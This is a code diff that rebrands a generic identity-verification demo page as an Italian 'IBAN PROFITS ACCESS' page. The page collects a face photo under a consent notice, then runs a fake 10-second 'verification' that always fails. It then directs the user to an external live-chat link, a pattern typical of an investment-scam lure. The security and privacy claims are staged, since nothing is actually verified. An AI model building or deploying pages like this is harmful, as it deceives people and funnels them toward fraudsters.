@@ -1,139 +1,39 @@
 <!doctype html>
-<html lang="en">
+<html lang="it">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Identity Verification</title>
+  <title>IBAN PROFITS ACCESS - Verifica Identità</title>
   <style>
     :root {
       --bg: #f6f8fb;
       --card: #ffffff;
       --accent: #0b66c3;
       --muted: #6b7280;
-      --success: #0f9d58;
       --error: #d64545;
-      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
     }
-    body {
-      margin: 0;
-      background: linear-gradient(180deg,#eef3fb 0%, var(--bg) 100%);
-      color: #111827;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-    .container {
-      max-width: 880px;
-      margin: 48px auto;
-      padding: 24px;
-    }
-    .card {
-      background: var(--card);
-      border-radius: 10px;
-      box-shadow: 0 6px 24px rgba(14,30,37,0.08);
-      padding: 28px;
-      display: grid;
-      grid-template-columns: 1fr 360px;
-      gap: 24px;
-    }
-    header.logo {
-      display:flex;
-      align-items:center;
-      gap:12px;
-      margin-bottom: 8px;
-    }
-    .brand {
-      display:flex;
-      flex-direction:column;
-    }
-    h1 {
-      margin:0;
-      font-size:20px;
-      color: #0f1724;
-    }
-    p.lead {
-      margin:8px 0 18px 0;
-      color: var(--muted);
-      font-size:14px;
-    }
-    .instructions { font-size:14px; color:var(--muted); margin-bottom:18px; }
-    .consent {
-      background:#fafbff;
-      border:1px solid #e6eefc;
-      padding:12px;
-      border-radius:8px;
-      margin-bottom:14px;
-      font-size:13px;
-      color:#243248;
-    }
-    .controls {
-      display:flex;
-      gap:8px;
-      margin-bottom:12px;
-      flex-wrap:wrap;
-    }
-    button, .btn {
-      background: var(--accent);
-      color: #fff;
-      border: none;
-      padding: 10px 14px;
-      border-radius:8px;
-      cursor:pointer;
-      font-weight:600;
-      font-size:14px;
-    }
-    .btn.secondary {
-      background: transparent;
-      border:1px solid #cfe3fb;
-      color: var(--accent);
-    }
-    .right {
-      padding: 12px;
-      border-left: 1px solid #f1f5f9;
-    }
-    video, img.preview {
-      width:100%;
-      height:220px;
-      object-fit:cover;
-      border-radius:8px;
-      background:#e9eef6;
-      border:1px solid #e6eefc;
-    }
-    .upload {
-      display:flex;
-      gap:8px;
-      align-items:center;
-    }
+    body { margin:0; background:linear-gradient(180deg,#eef3fb 0%, var(--bg) 100%); color:#111827; }
+    .container { max-width:880px; margin:48px auto; padding:24px; }
+    .card { background:var(--card); border-radius:10px; box-shadow:0 6px 24px rgba(14,30,37,0.08); padding:28px; display:grid; grid-template-columns:1fr 360px; gap:24px; }
+    header.logo { display:flex; align-items:center; gap:12px; margin-bottom:8px; }
+    h1 { margin:0; font-size:20px; color:#0f1724; }
+    p.lead { margin:8px 0 18px 0; color:var(--muted); font-size:14px; }
+    .consent { background:#fafbff; border:1px solid #e6eefc; padding:12px; border-radius:8px; margin-bottom:14px; font-size:13px; color:#243248; }
+    .controls { display:flex; gap:8px; margin-bottom:12px; flex-wrap:wrap; }
+    button, .btn { background:var(--accent); color:#fff; border:none; padding:10px 14px; border-radius:8px; cursor:pointer; font-weight:600; font-size:14px; }
+    .btn.secondary { background:transparent; border:1px solid #cfe3fb; color:var(--accent); }
+    .right { padding:12px; border-left:1px solid #f1f5f9; }
+    video, img.preview { width:100%; height:220px; object-fit:cover; border-radius:8px; background:#e9eef6; border:1px solid #e6eefc; }
     input[type="file"] { display:none; }
-    .progress {
-      height:12px;
-      background:#eef2ff;
-      border-radius:8px;
-      overflow:hidden;
-      margin-top:12px;
-      display:none;
-    }
-    .progress > i {
-      display:block;
-      height:100%;
-      background: linear-gradient(90deg,var(--accent), #5aa3ff);
-      width:0%;
-      transition: width 0.3s linear;
-    }
-    .result {
-      margin-top:14px;
-      padding:12px;
-      border-radius:8px;
-      font-size:14px;
-      display:none;
-    }
+    .progress { height:12px; background:#eef2ff; border-radius:8px; overflow:hidden; margin-top:12px; display:none; }
+    .progress > i { display:block; height:100%; background: linear-gradient(90deg,var(--accent), #5aa3ff); width:0%; transition: width 0.3s linear; }
+    .result { margin-top:14px; padding:12px; border-radius:8px; font-size:14px; display:none; }
     .result.error { background:#fff3f3; color:var(--error); border:1px solid #ffd6d6; }
     .result.info { background:#f0f7ff; color:#0b66c3; border:1px solid #dbeeff; }
     .footnote { font-size:12px; color:var(--muted); margin-top:12px; }
-    small.legal { display:block; margin-top:8px; color:var(--muted); font-size:12px; }
-    @media (max-width:900px) {
-      .card { grid-template-columns: 1fr; }
-      .right { border-left:none; border-top:1px solid #f1f5f9; padding-top:18px; }
-    }
+    small.legal { display:block; margin-top:8px; color:var(--muted); }
+    @media (max-width:900px) { .card { grid-template-columns:1fr; } .right { border-left:none; border-top:1px solid #f1f5f9; padding-top:18px; } }
   </style>
 </head>
 <body>
@@ -146,50 +46,47 @@
             <path d="M7 12h10" stroke="#fff" stroke-width="1.5" stroke-linecap="round"/>
             <path d="M7 8h10" stroke="#fff" stroke-width="1.5" stroke-linecap="round" opacity="0.8"/>
           </svg>
-          <div class="brand">
-            <strong style="font-size:15px">Acme Verification</strong>
-            <small style="color:var(--muted)">Secure identity verification</small>
+          <div style="display:flex;flex-direction:column">
+            <strong style="font-size:15px">IBAN PROFITS ACCESS</strong>
+            <small style="color:var(--muted)">Verifica identità sicura</small>
           </div>
         </header>
 
-        <h1 id="verify-title">Identity Verification</h1>
-        <p class="lead">Please complete the verification steps below. This process helps us confirm your identity in a secure and privacy-respecting way.</p>
+        <h1 id="verify-title">Verifica identità</h1>
+        <p class="lead">Completa i passaggi di seguito per confermare la tua identità. Questo processo è sicuro e rispetta la privacy.</p>
 
-        <div class="consent" role="group" aria-label="Consent">
-          <strong>Consent required</strong>
+        <div class="consent" role="group" aria-label="Consenso">
+          <strong>Consenso richiesto</strong>
           <div style="margin-top:6px;color:var(--muted);font-size:13px;">
-            By continuing you consent to temporarily capture and transmit a photo for automated identity verification. We will not store your photo unless you explicitly agree and we will handle biometric data only in accordance with our privacy policy.
-            <a href="#" style="color:var(--accent);text-decoration:none;margin-left:6px">Read privacy policy</a>
+            Procedendo acconsenti alla cattura temporanea di una foto per la verifica automatica dell'identità. Le immagini non verranno conservate senza il tuo consenso esplicito. Consulta la nostra <a href="#" style="color:var(--accent);text-decoration:none;margin-left:6px">informativa privacy</a>.
           </div>
         </div>
 
         <label style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
           <input id="consentCheckbox" type="checkbox" aria-required="true" />
-          <span style="font-size:14px;color:var(--muted)">I consent to capture and verification of my photo</span>
+          <span style="font-size:14px;color:var(--muted)">Do il consenso alla cattura e verifica della mia foto</span>
         </label>
 
         <div class="controls" aria-hidden="false">
-          <label class="btn secondary" id="use-camera-btn" title="Take a live photo" role="button" tabindex="0">
-            Use camera
-          </label>
+          <label class="btn secondary" id="use-camera-btn" title="Scatta una foto" role="button" tabindex="0">Usa fotocamera</label>
 
-          <label class="btn secondary upload" title="Upload an image">
-            <span>Upload photo</span>
+          <label class="btn secondary upload" title="Carica immagine">
+            <span>Carica foto</span>
             <input type="file" id="fileInput" accept="image/*" />
           </label>
 
-          <button id="approveBtn" class="btn" aria-disabled="true">Approve</button>
+          <button id="approveBtn" class="btn" aria-disabled="true">Approva</button>
         </div>
 
-        <small class="legal">Only proceed if you are the person on the ID. Do not share images of other people without their explicit permission.</small>
+        <small class="legal">Procedi solo se sei il titolare del documento. Non caricare foto di terze persone senza autorizzazione.</small>
       </div>
 
       <aside class="right" aria-labelledby="preview-heading">
-        <h2 id="preview-heading" style="margin:0 0 8px 0;font-size:15px">Preview</h2>
+        <h2 id="preview-heading" style="margin:0 0 8px 0;font-size:15px">Anteprima</h2>
         <div id="previewArea">
           <video id="video" autoplay playsinline style="display:none" aria-hidden="true"></video>
-          <img id="previewImage" class="preview" alt="Uploaded or captured photo preview" />
-          <div style="margin-top:8px;color:var(--muted)">Tip: Make sure your face is well-lit and fully visible. Remove hats and sunglasses.</div>
+          <img id="previewImage" class="preview" alt="Anteprima foto caricata o catturata" />
+          <div style="margin-top:8px;color:var(--muted)">Suggerimento: assicurati che il viso sia ben illuminato e visibile. Rimuovi cappelli e occhiali da sole.</div>
         </div>
 
         <div class="progress" id="progressBar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
@@ -200,7 +97,7 @@
         <div class="result error" id="errorBox" role="alert" aria-live="assertive" style="display:none"></div>
 
         <div class="footnote">
-          Need help? Contact support at <a href="mailto:support@example.com">support@example.com</a>.
+          Assistenza: <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank" rel="noopener noreferrer">Contatta il supporto</a>
         </div>
       </aside>
     </div>
@@ -238,7 +135,7 @@
       useCameraBtn.addEventListener('click', async () => {
         resetMessages();
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          errorBox.textContent = 'Camera is not available in this browser.';
+          errorBox.textContent = 'La fotocamera non è disponibile in questo browser.';
           errorBox.style.display = 'block';
           return;
         }
@@ -247,31 +144,27 @@
           video.srcObject = stream;
           video.style.display = 'block';
           previewImg.style.display = 'none';
-          // Offer a small "capture" on click of video
-          useCameraBtn.textContent = 'Capture photo';
+          useCameraBtn.textContent = 'Cattura foto';
           useCameraBtn.onclick = captureFromVideo;
         } catch (err) {
           console.error(err);
-          errorBox.textContent = 'Unable to access camera. Please allow camera permissions or use the upload option.';
+          errorBox.textContent = 'Impossibile accedere alla fotocamera. Consenti i permessi o usa l\'opzione di caricamento.';
           errorBox.style.display = 'block';
         }
       });
 
-      async function captureFromVideo() {
+      function captureFromVideo() {
         if (!video || !stream) return;
-        const track = stream.getVideoTracks()[0];
-        const settings = track.getSettings();
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || (settings.width || 640);
-        canvas.height = video.videoHeight || (settings.height || 480);
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         canvas.toBlob((blob) => {
           setPreviewImageFromBlob(blob);
-          // stop stream
           stream.getTracks().forEach(t => t.stop());
           stream = null;
-          useCameraBtn.textContent = 'Use camera';
+          useCameraBtn.textContent = 'Usa fotocamera';
           useCameraBtn.onclick = null;
         }, 'image/jpeg', 0.92);
       }
@@ -281,14 +174,13 @@
         const f = ev.target.files && ev.target.files[0];
         if (!f) return;
         if (!f.type.startsWith('image/')) {
-          errorBox.textContent = 'Please upload a valid image file.';
+          errorBox.textContent = 'Carica un file immagine valido.';
           errorBox.style.display = 'block';
           return;
         }
         setPreviewImageFromBlob(f);
       });
 
-      // enable/disable approve button based on consent and whether an image exists
       function updateApproveState() {
         const enabled = consentCheckbox.checked && (currentImageBlob || previewImg.src);
         approveBtn.disabled = !enabled;
@@ -296,26 +188,25 @@
       }
       consentCheckbox.addEventListener('change', updateApproveState);
 
-      // Approve handler: simulate verification loading for 10 seconds with progress bar
       approveBtn.addEventListener('click', async () => {
         resetMessages();
         updateApproveState();
         if (!consentCheckbox.checked) {
-          errorBox.textContent = 'Please provide consent to proceed.';
+          errorBox.textContent = 'Per favore, fornisci il consenso per procedere.';
           errorBox.style.display = 'block';
           return;
         }
         if (!currentImageBlob && !previewImg.src) {
-          errorBox.textContent = 'Please upload or capture a photo first.';
+          errorBox.textContent = 'Carica o cattura prima una foto.';
           errorBox.style.display = 'block';
           return;
         }
 
-        // Start simulated verification
+        // Simulated verification progress (10 seconds)
         progressBar.style.display = 'block';
         progressFill.style.width = '0%';
         infoBox.style.display = 'block';
-        infoBox.textContent = 'Verifying identity — this may take a few moments. Please stay on this page.';
+        infoBox.textContent = 'Verifica in corso — attendere prego.';
         errorBox.style.display = 'none';
 
         let seconds = 10;
@@ -330,26 +221,21 @@
           if (elapsed >= total) {
             clearInterval(timer);
             progressFill.style.width = '100%';
-            // Simulated result (for demo purposes) — in production call your verification API and handle real response
             progressBar.style.display = 'none';
             infoBox.style.display = 'none';
 
-            // Neutral, professional message: do not demand payment here
-            errorBox.innerHTML = '<strong>Verification could not be completed automatically.</strong> For security reasons, additional documentation is required. Please contact our support team or upload a valid ID document. We will not process payments from this screen.';
+            // Safe, professional next-step message: do not include payment demands
+            errorBox.innerHTML = '<strong>Verifica non completata automaticamente.</strong> Per motivi di sicurezza è richiesto un ulteriore controllo. Per assistenza e istruzioni contatta il supporto: <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank" rel="noopener noreferrer">Apri chat supporto</a>.';
             errorBox.style.display = 'block';
           }
         }, interval);
       });
 
-      // update approve state when preview image set
       const observer = new MutationObserver(updateApproveState);
       observer.observe(previewImg, { attributes: true, attributeFilter: ['src'] });
       updateApproveState();
 
-      // cleanup on page hide
-      window.addEventListener('beforeunload', () => {
-        if (stream) stream.getTracks().forEach(t => t.stop());
-      });
+      window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
     })();
   </script>
 </body>
